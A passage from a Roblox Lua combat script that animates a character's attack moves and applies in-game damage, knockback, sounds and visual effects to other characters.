LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,1.3+0.3*i) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(2.5-1.8,-0.3+0.6,0) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,1.57,-1) 
end 
for i = 0,1,0.3 do 
wait() 
Torso.Neck.C1 = CFrame.fromEulerAnglesXYZ(1.57,3.14,-1.57) * CFrame.new(0,0,-0.5) 
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0.7-1,-0.3,-0.3) 
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,0,1.3+0.3-0.3*i) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(2.5-1.8,-0.3+0.6,0) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0,1.57,-1) 
end 
wait(0.1) 
gairo.Parent = nil 
attack = false 
end 
function Onslaught() 
attack = true 
Character.Humanoid.WalkSpeed = 0 
walking = false 
Torso.Neck.C1 = CFrame.fromEulerAnglesXYZ(1.57,3.14,-1.57) * CFrame.new(0,0,-0.5) 
gairo.Parent = Head
gairo.maxTorque = Vector3.new(4e+005,4e+005,4e+005)*math.huge 
gairo.P = 20e+003 
gairo.cframe = Head.CFrame 
for i = 0,1,0.1 do 
wait() 
Torso.Neck.C1 = CFrame.fromEulerAnglesXYZ(1.57,3.14,-1.57) * CFrame.new(0,0,-0.5) 
LW.C0 = CFrame.new(-1.5+0.5*i, 0.5, -0.5*i) * CFrame.fromEulerAnglesXYZ(-0.3,0.3,-0.3) 
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(-0.8*i,0,-2*i) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(0.2,0.2,0.5+0.5*i) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0.37*i,0,0) 
end 
ss(workspace,1) 
wait(0.2) 
con1=prt1.Touched:connect(function(hit) Damagefunc1(hit,20,10) end)
for i = 0,1,0.15 do 
wait() 
Torso.Neck.C1 = CFrame.fromEulerAnglesXYZ(1.57,3.14,-1.57+3.5*i) * CFrame.new(0,0,-0.5) 
LW.C0 = CFrame.new(-1.5+0.5-0.5*i, 0.5, -0.5+0.5*i) * CFrame.fromEulerAnglesXYZ(-0.3,0.3,-0.3) 
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(-0.8-2*i,0,-2) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(0.2,0.2,1+0.67*i) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0.37,0,0) 
end 
con1:disconnect() 
wait(0.2) 
boomeffect2(RightArm,30,50) 
bewm(workspace,1) 
ss(workspace,1) 
for i = 0,1,0.3 do 
wait() 
Torso.Neck.C1 = CFrame.fromEulerAnglesXYZ(1.57,3.14,-1.57+3.5) * CFrame.new(0,0,-0.5) 
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(-0.3,0.3,-0.3) 
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(-0.8-2,0,-2) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(0.2,0.2,1+0.67) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0.37,0,-0.3*i) 
end 
for i = 0,1,0.3 do 
wait() 
Torso.Neck.C1 = CFrame.fromEulerAnglesXYZ(1.57,3.14,-1.57+3.5) * CFrame.new(0,0,-0.5) 
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(-0.3,0.3,-0.3) 
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(-0.8-2,0,-2) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(0.2,0.2,1+0.67) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0.37,0,-0.3+0.3*i) 
end 
wait(0.2) 
gairo.Parent = nil 
attack = false 
end 
function DestroyerOfHeaven() 
attack = true 
Character.Humanoid.WalkSpeed = 0 
walking = false 
Torso.Neck.C1 = CFrame.fromEulerAnglesXYZ(1.57,3.14,-1.57) * CFrame.new(0,0,-0.5) 
gairo.Parent = Head
gairo.maxTorque = Vector3.new(4e+005,4e+005,4e+005)*math.huge 
gairo.P = 20e+003 
gairo.cframe = Head.CFrame 
for i = 0,1,0.1 do 
wait() 
Torso.Neck.C1 = CFrame.fromEulerAnglesXYZ(1.57,3.14,-1.57) * CFrame.new(0,0,-0.5) 
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(-0.3,0.3,-0.3) 
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(-0.3*i,0.3*i,-0.2*i) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(0.2,0.2,0.5) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0.2*i,0.2*i,-0.3*i) 
end 
ss(workspace,1) 
wait(0.2) 
local vel = Instance.new("BodyVelocity")
vel.Parent = Torso
vel.maxForce = Vector3.new(4e+005,4e+005,4e+005)*2
vel.velocity = Head.CFrame.lookVector * 80 
slasheffect() 
con1=Torso.Touched:connect(function(hit) DOH(hit,5,0) end)
con2=part1.Touched:connect(function(hit) DOH(hit,5,0) end)
con3=prt1.Touched:connect(function(hit) DOH(hit,5,0) end)
for i = 0,1,0.2 do 
wait() 
Clone() 
Torso.Neck.C1 = CFrame.fromEulerAnglesXYZ(1.57,3.14,-1.57+3.14*i) * CFrame.new(0,0,-0.5) 
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(-0.3,0.3,-0.3-1.3*i) 
LW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(-0.3,0.3,-0.2) 
RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(0.2,0.2,0.5) 
RW.C1 = CFrame.new(0, 0.5, 0) * CFrame.fromEulerAnglesXYZ(0.2,0.2,-0.3-0.6*i) 
end 
wait(0.1) 
vel.Parent = nil 
wait(0.2) 
con1:disconnect() 
con2:disconnect() 
con3:disconnect() 
wait(0.3) 
gairo.Parent = nil 
attack = false 
end 
function OT(hit) 
if hit.Parent == nil then return end 
local hum = hit.Parent:findFirstChild("Humanoid") 
if hum ~= nil and hum ~= Character.Humanoid then 
hum:TakeDamage(damage) 
end 
end 
function OT2(hit) 
if hit.Parent == nil then return end 
local hum = hit.Parent:findFirstChild("Humanoid") 
if hum ~= nil and hum ~= Character.Humanoid then 
hum:TakeDamage(damage) 
local torso = hit.Parent:findFirstChild("Torso") 
if torso.Parent ~= nil then 
if (torso.Position-RightArm.Position).magnitude<=25 then
local angle = (torso.Position-(RightArm.Position+Vector3.new(0,-3,0))).unit
torso.CFrame=CFrame.new(torso.Position,Vector3.new(angle.x,torso.Position.y,angle.z))*CFrame.fromEulerAnglesXYZ(math.pi/4,0,0)
                                                local Gyro=Instance.new("BodyGyro")
                                                Gyro.P=1000
                                                Gyro.D=Gyro.D/2
                                                Gyro.maxTorque=Vector3.new(30000,30000,30000)*300000
                                                Gyro.cframe=torso.CFrame*CFrame.fromEulerAnglesXYZ(math.pi/4,0,0)
                                                Gyro.Parent=torso
local bodyVelocity=Instance.new("BodyVelocity")
bodyVelocity.velocity=angle*40+Vector3.new(0,35,0)
bodyVelocity.P=500
bodyVelocity.maxForce=Vector3.new(4e+003, 4e+003, 4e+003)
bodyVelocity.Parent=torso
coroutine.resume(coroutine.create(function() 
wait(0.3) 
bodyVelocity:Remove() 
end)) 
coroutine.resume(coroutine.create(function() 
wait(0.8) 
Gyro:Remove() 
end)) 
end
end
end 
end 
function ss(parent,pitch) 
local SlashSound = Instance.new("Sound") 
SlashSound.SoundId = "rbxasset://sounds\\swordslash.wav" 
SlashSound.Parent = parent 

SlashSound.Volume = .7 
SlashSound.Pitch = pitch 
SlashSound.PlayOnRemove = true 
coroutine.resume(coroutine.create(function() 
wait(0) 
SlashSound.Parent = nil 
end)) 
end 
function bewm(parent,pitch) 
local SlashSound = Instance.new("Sound") 
SlashSound.SoundId = "http://www.roblox.com/asset/?id=2248511" 
SlashSound.Parent = parent 

SlashSound.Volume = .7 
SlashSound.Pitch = pitch 
SlashSound.PlayOnRemove = true 
coroutine.resume(coroutine.create(function() 
wait(0) 
SlashSound.Parent = nil 
end)) 
end 
function boomeffect() 
local mesh = Instance.new("SpecialMesh") 
mesh.Scale = Vector3.new(2,2,2) 
mesh.MeshId = "http://www.roblox.com/asset/?id=1323306" 
local shell = Instance.new("Part") 
mesh.Parent = shell 
shell.Anchored = true 
shell.formFactor = 1 
shell.Size = Vector3.new(3,2,2) 
shell.CFrame = Torso.CFrame * CFrame.new(0,-2,-3)
shell.Parent = game.workspace 
shell.Transparency = 0 
shell.BrickColor = BrickColor.new("Bright red") 
shell.CanCollide = false 
local mesh2 = Instance.new("SpecialMesh") 
mesh2.Scale = Vector3.new(2,2,2) 
mesh2.MeshId = "http://www.roblox.com/asset/?id=20329976" 
local shell2 = Instance.new("Part") 
mesh2.Parent = shell2 
shell2.Anchored = true 
shell2.formFactor = 1 
shell2.Size = Vector3.new(3,2,2) 
shell2.CFrame = Torso.CFrame * CFrame.new(0,-2,-3)
shell2.Parent = game.workspace 
shell2.Transparency = 0 
shell2.BrickColor = BrickColor.new("Bright yellow") 
shell2.CanCollide = false 
        local c = game.Workspace:GetChildren();
        for i = 1, #c do
                local hum = c[i]:findFirstChild("Humanoid")
                if hum ~= nil and hum.Health ~= 0 then
                local head = c[i]:findFirstChild("Head");
                if head ~= nil then
                local targ = head.Position - shell.Position;
                local mag = targ.magnitude;
                if mag <= 6 and c[i].Name ~= Player.Name then 
                DBHit(head,math.random(5,10)) 
                end 
                end 
                end 
        end 
coroutine.resume(coroutine.create(function(part,mash) 
for i = 0 , 1 , 0.1 do 
wait(0.045) 
mash.Scale = mesh.Scale + Vector3.new(1,1.2,1) 
part.CFrame = shell.CFrame * CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(0,1.5,0) 
part.Transparency = shell.Transparency + 0.2
end 
part.Transparency = 1 
part.Parent = nil 
end),shell,mesh) 
coroutine.resume(coroutine.create(function(part,mash) 
for i = 0 , 1 , 0.1 do 
wait(0.035) 
mash.Scale = mesh.Scale + Vector3.new(0.8,0.6,0.8) 
part.CFrame = shell.CFrame * CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(0,1.5,0) 
part.Transparency = shell.Transparency + 0.2
end 
part.Transparency = 1 
part.Parent = nil 
end),shell2,mesh2) 
end 
function boomeffect2(Arm,Numb1,Numb2) 
local mesh = Instance.new("BlockMesh") 
local shell = Instance.new("Part") 
mesh.Parent = shell 
shell.Anchored = true 
shell.formFactor = 1 
shell.Size = Vector3.new(2,2,2) 
shell.CFrame = Arm.CFrame * CFrame.new(0,-1.2,0)
shell.Parent = game.workspace 
shell.Transparency = 0 
shell.BrickColor = BrickColor.new("Bright red") 
shell.CanCollide = false 
local mesh2 = Instance.new("SpecialMesh") 
mesh2.MeshType = "Sphere" 
local shell2 = Instance.new("Part") 
mesh2.Parent = shell2 
shell2.Anchored = true 
shell2.formFactor = 1 
shell2.Size = Vector3.new(2,2,2) 
shell2.CFrame = Arm.CFrame * CFrame.new(0,-1.2,0)
shell2.Parent = game.workspace 
shell2.Transparency = 0 
shell2.BrickColor = BrickColor.new("Bright yellow") 
shell2.CanCollide = false 
        local c = game.Workspace:GetChildren();
        for i = 1, #c do
                local hum = c[i]:findFirstChild("Humanoid")
                if hum ~= nil and hum.Health ~= 0 then
                local head = c[i]:findFirstChild("Head");
                if head ~= nil then
                local targ = head.Position - shell.Position;
                local mag = targ.magnitude;
                if mag <= 6 and c[i].Name ~= Player.Name then 
                DBHit2(head,math.random(Numb1,Numb2)) 
                end 
                end 
                end 
        end 
coroutine.resume(coroutine.create(function(part,mash) 
for i = 0 , 1 , 0.1 do 
wait(0.038) 
part.CFrame = part.CFrame * CFrame.fromEulerAnglesXYZ(math.random(-50,50),math.random(-50,50),math.random(-50,50)) 
part.Transparency = part.Transparency + 0.2 
mash.Scale = mash.Scale + Vector3.new(0.1,0.1,0.1) 
end 
part.Transparency = 1 
part.Parent = nil 
end),shell,mesh) 
coroutine.resume(coroutine.create(function(part2,mash2) 
for i = 0 , 1 , 0.1 do 
wait(0.038) 
part2.CFrame = part2.CFrame * CFrame.fromEulerAnglesXYZ(math.random(-50,50),math.random(-50,50),math.random(-50,50)) 
part2.Transparency = part2.Transparency + 0.3 
mash2.Scale = mash2.Scale + Vector3.new(0.6,0.4,0.6) 
end 
part2.Transparency = 1 
part2.Parent = nil 
end),shell2,mesh2) 
end 
function DOHeffect(Arm,Numb1,Numb2,x,y,z) 
local mesh = Instance.new("BlockMesh") 
local shell = Instance.new("Part") 
mesh.Parent = shell 
shell.Anchored = true 
shell.formFactor = 1 
shell.Size = Vector3.new(2,2,2) 
shell.CFrame = Arm.CFrame * CFrame.new(x,y,z)
shell.Parent = game.workspace 
shell.Transparency = 0 
shell.BrickColor = BrickColor.new("Bright red") 
shell.CanCollide = false 
local mesh2 = Instance.new("SpecialMesh") 
mesh2.MeshType = "Sphere" 
local shell2 = Instance.new("Part") 
mesh2.Parent = shell2 
shell2.Anchored = true 
shell2.formFactor = 1 
shell2.Size = Vector3.new(2,2,2) 
shell2.CFrame = Arm.CFrame * CFrame.new(x,y,z)
shell2.Parent = game.workspace 
shell2.Transparency = 0 
shell2.BrickColor = BrickColor.new("Bright yellow") 
shell2.CanCollide = false 
        local c = game.Workspace:GetChildren();
        for i = 1, #c do
                local hum = c[i]:findFirstChild("Humanoid")
                if hum ~= nil and hum.Health ~= 0 then
                local head = c[i]:findFirstChild("Head");
                if head ~= nil then
                local targ = head.Position - shell.Position;
                local mag = targ.magnitude;
                if mag <= 6 and c[i].Name ~= Player.Name then 
                DOHHit(head,math.random(Numb1,Numb2),10) 
                end 
                end 
                end 
        end 
coroutine.resume(coroutine.create(function(part) 
for i = 0 , 1 , 0.1 do 
wait(0.038) 
part.CFrame = part.CFrame * CFrame.fromEulerAnglesXYZ(math.random(-50,50),math.random(-50,50),math.random(-50,50)) 
part.Transparency = part.Transparency + 0.2 
mesh.Scale = mesh.Scale + Vector3.new(0.1,0.1,0.1) 
end 
part.Transparency = 1 
part.Parent = nil 
end),shell) 
coroutine.resume(coroutine.create(function(part) 
for i = 0 , 1 , 0.1 do 
wait(0.038) 
part.CFrame = part.CFrame * CFrame.fromEulerAnglesXYZ(math.random(-50,50),math.random(-50,50),math.random(-50,50)) 
part.Transparency = part.Transparency + 0.3 
mesh2.Scale = mesh2.Scale + Vector3.new(0.6,0.4,0.6) 
end 
part.Transparency = 1 
part.Parent = nil 
end),shell2) 
end 
function slasheffect() 
local mesh = Instance.new("BlockMesh") 
mesh.Scale = Vector3.new(0.2,0.2,10) 
local shell = Instance.new("Part") 
mesh.Parent = shell 
shell.Anchored = true 
shell.formFactor = 1 
shell.Size = Vector3.new(2,2,2) 
shell.CFrame = Head.CFrame * CFrame.new(0,-2,-10)
shell.Parent = game.workspace 
shell.Transparency = 0 
shell.BrickColor = BrickColor.new("Bright yellow") 
shell.CanCollide = false 
coroutine.resume(coroutine.create(function(part) 
for i = 0 , 1 , 0.1 do 
wait(0.038) 
--part.CFrame = part.CFrame * CFrame.fromEulerAnglesXYZ(math.random(-50,50),math.random(-50,50),math.random(-50,50)) 
part.Transparency = part.Transparency + 0.15 
--mesh.Scale = mesh.Scale + Vector3.new(0.1,0.1,0.1) 
end 
part.Transparency = 1 
part.Parent = nil 
end),shell) 
end 
function effect() 
local clone = blade1:clone() 
clone.Parent = workspace 
clone.Anchored = true 
clone.Transparency = 0.6 
clone.Reflectance = 0 
clone.Mesh.Scale = clone.Mesh.Scale + Vector3.new(0.1,0.1,0.1) 
clone.BrickColor = BrickColor.new("New Yeller") 
coroutine.resume(coroutine.create(function() 
wait(0.25) 
clone.Parent = nil 
end)) 
end 
DBHit=function(hit,Damage) --credits to turdulator for making this function :D
        if hit.Parent==nil then
                return
        end
        h=hit.Parent:FindFirstChild("Humanoid")
        t=hit.Parent:FindFirstChild("Torso")
        if h~=nil and t~=nil then
                if h.Parent==Character then
                        return
                end
                if math.random(0,99)+math.random()<=7.8 then
                        CRIT=true
                        Damage=Damage*3
--[[                        Knockback=Knockback*2
                        r=Instance.new("BodyAngularVelocity")
                        r.P=3000
                        r.maxTorque=Vector3.new(500000000,50000000000,500000000)*50000
                        r.angularvelocity=Vector3.new(math.random(-20,20),math.random(-20,20),math.random(-20,20))
                        r.Parent=hit.Parent.Torso]]
                        s=Instance.new("Sound")
                        s.SoundId="http://www.roblox.com/asset/?id=2801263"
                        s.Volume=1
                        s.Pitch=2
                        s.Parent=hit
                        s.PlayOnRemove=true
                        s.Parent=nil
        
                end
                h:TakeDamage(Damage) 
                showDamage(hit.Parent,Damage,.5) 
                vl=Instance.new("BodyVelocity")
                vl.P=4500
                vl.maxForce=Vector3.new(math.huge,math.huge,math.huge)
--                vl.velocity=Vector3.new(Torso.Velocity.x,0,Torso.Velocity.z)*1.05+Vector3.new(0,3,0)
                vl.velocity=Vector3.new(Torso.Velocity.x,0,Torso.Velocity.z)*1.05+Vector3.new(0,45,0)
                vl.Parent=t
                game:GetService("Debris"):AddItem(vl,.2)
                rl=Instance.new("BodyAngularVelocity")
                rl.P=3000
                rl.maxTorque=Vector3.new(500000,500000,500000)*50000000000000
--                rl.angularvelocity=Vector3.new(math.random(-40,40),math.random(-40,40),math.random(-40,40))
                local tes = math.random(1,2) 
                if tes == 1 then 
                rl.angularvelocity=Vector3.new(0,0,math.random(-40,40)) 
                elseif tes == 2 then 
                rl.angularvelocity=Vector3.new(math.random(-40,40),0,0) 
                end 
                rl.Parent=t
                game:GetService("Debris"):AddItem(rl,.2)
        else
                if hit.CanCollide==false then
                        return
                end
                MagicCom:disconnect()
--                DBExplode(DB)
        end
end
DBHit2=function(hit,Damage) --credits to turdulator for making this function :D
        if hit.Parent==nil then
                return
        end
        h=hit.Parent:FindFirstChild("Humanoid")
        t=hit.Parent:FindFirstChild("Torso")
        if h~=nil and t~=nil then
                if h.Parent==Character then
                        return
                end
                if math.random(0,99)+math.random()<=7.8 then
                        CRIT=true
                        Damage=Damage*3
--[[                        Knockback=Knockback*2
                        r=Instance.new("BodyAngularVelocity")
                        r.P=3000
                        r.maxTorque=Vector3.new(500000000,50000000000,500000000)*50000
                        r.angularvelocity=Vector3.new(math.random(-20,20),math.random(-20,20),math.random(-20,20))
                        r.Parent=hit.Parent.Torso]]
                        s=Instance.new("Sound")
                        s.SoundId="http://www.roblox.com/asset/?id=2801263"
                        s.Volume=1
                        s.Pitch=2
                        s.Parent=hit
                        s.PlayOnRemove=true
                        s.Parent=nil
        
                end
                h:TakeDamage(Damage) 
                showDamage(hit.Parent,Damage,.5) 
                vl=Instance.new("BodyVelocity")
                vl.P=4500
                vl.maxForce=Vector3.new(math.huge,math.huge,math.huge)
--                vl.velocity=Vector3.new(Torso.Velocity.x,0,Torso.Velocity.z)*1.05+Vector3.new(0,30,0)
                vl.velocity=Head.CFrame.lookVector*35+Head.Velocity/1.05
                vl.Parent=t
                game:GetService("Debris"):AddItem(vl,.2)
                rl=Instance.new("BodyAngularVelocity")
                rl.P=3000
                rl.maxTorque=Vector3.new(500000,500000,500000)*50000000000000
                rl.angularvelocity=Vector3.new(math.random(-10,10),math.random(-10,10),math.random(-10,10))
                rl.Parent=t
                game:GetService("Debris"):AddItem(rl,.2)
        else
                if hit.CanCollide==false then
                        return
                end
                MagicCom:disconnect()
--                DBExplode(DB)
        end
end
DOHHit=function(hit,Damage,Pos) --credits to turdulator for making this function :D
        if hit.Parent==nil then
                return
        end
        h=hit.Parent:FindFirstChild("Humanoid")
        t=hit.Parent:FindFirstChild("Torso")
        if h~=nil and t~=nil then
                if h.Parent==Character then
                        return
                end
                if math.random(0,99)+math.random()<=7.8 then
                        CRIT=true
                        Damage=Damage*3
--[[                        Knockback=Knockback*2
                        r=Instance.new("BodyAngularVelocity")
                        r.P=3000
                        r.maxTorque=Vector3.new(500000000,50000000000,500000000)*50000
                        r.angularvelocity=Vector3.new(math.random(-20,20),math.random(-20,20),math.random(-20,20))
                        r.Parent=hit.Parent.Torso]]
                        s=Instance.new("Sound")
                        s.SoundId="http://www.roblox.com/asset/?id=2801263"
                        s.Volume=1
                        s.Pitch=2
                        s.Parent=hit
                        s.PlayOnRemove=true
                        s.Parent=nil
        
                end
                h:TakeDamage(Damage) 
                showDamage(hit.Parent,Damage,.5) 
                vl=Instance.new("BodyVelocity")
                vl.P=4500
                vl.maxForce=Vector3.new(math.huge,math.huge,math.huge)
--                vl.velocity=Vector3.new(Torso.Velocity.x,0,Torso.Velocity.z)*1.05+Vector3.new(0,60,0)
                vl.velocity=Head.CFrame.lookVector+Head.Velocity/1.05
                vl.Parent=t
                game:GetService("Debris"):AddItem(vl,.2)
                rl=Instance.new("BodyAngularVelocity")
                rl.P=3000
                rl.maxTorque=Vector3.new(500000,500000,500000)*50000000000000
                rl.angularvelocity=Vector3.new(math.random(-10,10),math.random(-10,10),math.random(-10,10))
                rl.Parent=t
                game:GetService("Debris"):AddItem(rl,.2)
        else
                if hit.CanCollide==false then
                        return
                end
                MagicCom:disconnect()
--                DBExplode(DB)
        end
end
Damagefunc1=function(hit,Damage,Knockback)
        if attackdebounce == false then 
        attackdebounce = true 
        coroutine.resume(coroutine.create(function() 
        wait(0.1) 
        attackdebounce = false 
        end)) 
        if hit.Parent==nil then
                return
        end
        CPlayer=Bin 
        h=hit.Parent:FindFirstChild("Humanoid")
        if h~=nil and hit.Parent.Name~=Player.Name and hit.Parent:FindFirstChild("Torso")~=nil then
                Damage=Damage
--[[                if game.Players:GetPlayerFromCharacter(hit.Parent)~=nil then
                        return
                end]]
                        c=Instance.new("ObjectValue")
                        c.Name="creator"
                        c.Value=game.Players.LocalPlayer
                        c.Parent=h
                        game:GetService("Debris"):AddItem(c,.5)
--                        print(c.Value)
                if math.random(0,99)+math.random()<=7.8 then
                        CRIT=true
                        Damage=Damage*3
--[[                        Knockback=Knockback*2
                        r=Instance.new("BodyAngularVelocity")
                        r.P=3000
                        r.maxTorque=Vector3.new(500000000,50000000000,500000000)*50000
                        r.angularvelocity=Vector3.new(math.random(-20,20),math.random(-20,20),math.random(-20,20))
                        r.Parent=hit.Parent.Torso]]
                        s=Instance.new("Sound")
                        s.SoundId="http://www.roblox.com/asset/?id=2801263"
                        s.Volume=1
                        s.Pitch=2
                        s.Parent=hit
                        s.PlayOnRemove=true
                        s.Parent=nil
        
                end
                Damage=Damage+math.random(0,10)
--                Blood(hit.CFrame*CFrame.new(math.random(-10,10)/10,math.random(-10,10)/10,0),math.floor(Damage/2))
                h:TakeDamage(Damage)
                showDamage(hit.Parent,Damage,.5)
                vp=Instance.new("BodyVelocity")
                vp.P=500
                vp.maxForce=Vector3.new(math.huge,0,math.huge)
--                vp.velocity=Character.Torso.CFrame.lookVector*Knockback
                vp.velocity=Torso.CFrame.lookVector*Knockback+Torso.Velocity/1.05
                if Knockback>0 then
                        vp.Parent=hit.Parent.Torso
                end
                game:GetService("Debris"):AddItem(vp,.25)
--[[                r=Instance.new("BodyAngularVelocity")
                r.P=3000
                r.maxTorque=Vector3.new(500000000,50000000000,500000000)*50000
                r.angularvelocity=Vector3.new(math.random(-20,20),math.random(-20,20),math.random(-20,20))
                r.Parent=hit.Parent.Torso]]
                game:GetService("Debris"):AddItem(r,.5)
                                c=Instance.new("ObjectValue")
                        c.Name="creator"
                        c.Value=Player
                        c.Parent=h
                        game:GetService("Debris"):AddItem(c,.5)
                CRIT=false
                hitDeb=true
                AttackPos=6
        end
        end 
end
DOH=function(hit,Damage,Knockback)
        if attackdebounce == false then 
        attackdebounce = true 
        coroutine.resume(coroutine.create(function() 
        wait(0.2) 
        attackdebounce = false 
        end)) 
        if hit.Parent==nil then
                return
        end
        CPlayer=Bin 
        h=hit.Parent:FindFirstChild("Humanoid")
        if h~=nil and hit.Parent.Name~=Player.Name and hit.Parent:FindFirstChild("Torso")~=nil then
                Damage=Damage
--[[                if game.Players:GetPlayerFromCharacter(hit.Parent)~=nil then
                        return
                end]]
                        c=Instance.new("ObjectValue")
                        c.Name="creator"
                        c.Value=game.Players.LocalPlayer
                        c.Parent=h
                        game:GetService("Debris"):AddItem(c,.5)
--                        print(c.Value)
                if math.random(0,99)+math.random()<=7.8 then
                        CRIT=true
                        Damage=Damage*3
--[[                        Knockback=Knockback*2
                        r=Instance.new("BodyAngularVelocity")
                        r.P=3000
                        r.maxTorque=Vector3.new(500000000,50000000000,500000000)*50000
                        r.angularvelocity=Vector3.new(math.random(-20,20),math.random(-20,20),math.random(-20,20))
                        r.Parent=hit.Parent.Torso]]
                        s=Instance.new("Sound")
                        s.SoundId="http://www.roblox.com/asset/?id=2801263"
                        s.Volume=1
                        s.Pitch=2
                        s.Parent=hit
                        s.PlayOnRemove=true
                        s.Parent=nil
        
                end
                Damage=Damage+math.random(0,10)
--                Blood(hit.CFrame*CFrame.new(math.random(-10,10)/10,math.random(-10,10)/10,0),math.floor(Damage/2))
                h:TakeDamage(Damage)
                showDamage(hit.Parent,Damage,.5)
                vp=Instance.new("BodyVelocity")
                vp.P=500
                vp.maxForce=Vector3.new(math.huge,0,math.huge)
--                vp.velocity=Character.Torso.CFrame.lookVector*Knockback
                vp.velocity=Torso.CFrame.lookVector*Knockback+Torso.Velocity/1.05
                if Knockback>0 then
                        vp.Parent=hit.Parent.Torso
                end
                game:GetService("Debris"):AddItem(vp,.25)
--[[                r=Instance.new("BodyAngularVelocity")
                r.P=3000
                r.maxTorque=Vector3.new(500000000,50000000000,500000000)*50000
                r.angularvelocity=Vector3.new(math.random(-20,20),math.random(-20,20),math.random(-20,20))
                r.Parent=hit.Parent.Torso]]
                game:GetService("Debris"):AddItem(r,.5)
                                c=Instance.new("ObjectValue")
                        c.Name="creator"
                        c.Value=Player
                        c.Parent=h
                        game:GetService("Debris"):AddItem(c,.5)
                wait(1) 
                DOHeffect(hit,5,15,2,0,0) 
                bewm(workspace,1) 
                wait(0.1) 
                DOHeffect(hit,5,15,-2,0.5,0) 
                bewm(workspace,1) 
                wait(0.1) 
                DOHeffect(hit,5,15,2,1,0) 
                bewm(workspace,1) 
                wait(0.1) 
                DOHeffect(hit,5,15,-2,1.5,0) 
                bewm(workspace,1) 
                CRIT=false
                hitDeb=true
                AttackPos=6
        end
        end 
end
showDamage=function(Char,Dealt,du)
        m=Instance.new("Model")
        m.Name=tostring(Dealt)
        h=Instance.new("Humanoid")
        h.Health=0
        h.MaxHealth=0
        h.Parent=m
        c=Instance.new("Part")
        c.Transparency=0
        c.BrickColor=BrickColor:Red()
        if CRIT==true then
                c.BrickColor=BrickColor.new("Really red")
        end
        c.Name="Head"
        c.TopSurface=0
        c.BottomSurface=0
        c.formFactor="Plate"
        c.Size=Vector3.new(1,.4,1)
        ms=Instance.new("CylinderMesh")
        ms.Scale=Vector3.new(.8,.8,.8)
        if CRIT==true then
                ms.Scale=Vector3.new(1.25,1.5,1.25)
        end
        ms.Parent=c
        c.Reflectance=0
        Instance.new("BodyGyro").Parent=c
        c.Parent=m
        c.CFrame=CFrame.new(Char["Head"].CFrame.p+Vector3.new(0,1.5,0))
        f=Instance.new("BodyPosition")
        f.P=2000
        f.D=100
        f.maxForce=Vector3.new(math.huge,math.huge,math.huge)
        f.position=c.Position+Vector3.new(0,3,0)
        f.Parent=c
        game:GetService("Debris"):AddItem(m,.5+du)
        c.CanCollide=false
        m.Parent=workspace
        c.CanCollide=false
end
function Clone() 
        for _,v in pairs(Torso.Parent:children()) do
                if v.className=="Part" then
                        n=v:clone()
                        n.archivable=true
                        n.Anchored=true
                        n.CanCollide=false
                        n.Name="TRAILER"
                        n.BrickColor=v.BrickColor
                        n.Parent=workspace
                        coroutine.resume(coroutine.create(function(ne) for i=1, 40 do ne.Transparency=i/40 wait() end ne.Parent=nil end),n)
                elseif v.className=="Hat" then
                        n=v.Handle:clone()
                        n.archivable=true
                        n.Anchored=true
                        n.CanCollide=false
                        n.Name="TRAILER"
                        n.BrickColor=v.Handle.BrickColor
                        n.Parent=workspace
                        coroutine.resume(coroutine.create(function(ne) for i=1, 40 do ne.Transparency=i/40 wait() end ne.Parent=nil end),n)
                end
        end
--[[        for _,v in pairs(modelzorz:children()) do
                if v.className=="Part" then
                        n=v:clone()
                        n.archivable=true
                        n.Anchored=true
                        n.CanCollide=false
                        n.Name="TRAILER"
                        n.BrickColor=v.BrickColor
                        n.Parent=workspace
                        coroutine.resume(coroutine.create(function(ne) for i=1, 12 do ne.Transparency=i/12 wait() end ne.Parent=nil end),n)
                end
        end]]
end 
function Stance() 
while walking == false do 
for i = 0,1,0.03 do 
wait() 
if walking == false and attack == false then 
Torso.Neck.C1 = CFrame.fromEulerAnglesXYZ(1.67+0.1*i,3.14,-1.57) * CFrame.new(0,0,-0.5) 
LW.C0 = CFrame.new(-1.5, 0.5, 0) * CFrame.fromEulerAnglesXYZ(-0.3,0.3-0.1*i,-0.3+0.1*i) 
